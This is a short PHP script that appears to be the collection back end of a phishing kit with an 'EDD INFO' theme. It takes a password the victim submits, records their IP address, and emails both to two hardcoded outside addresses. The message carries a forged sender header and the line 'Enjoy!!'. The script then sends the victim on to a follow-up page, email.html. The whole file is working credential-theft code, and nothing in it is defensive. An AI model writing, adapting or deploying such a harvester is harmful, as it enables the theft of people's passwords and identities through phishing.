<?php

$subject = " EDD INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['userpass']."\n";
$message = "Passsword: ".$_POST["userpass"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("wisdomoparah76@gmail.com,wisdomoparah76@yandex.com",$subject,$message, $headers);



header("location: email.html"); 



?>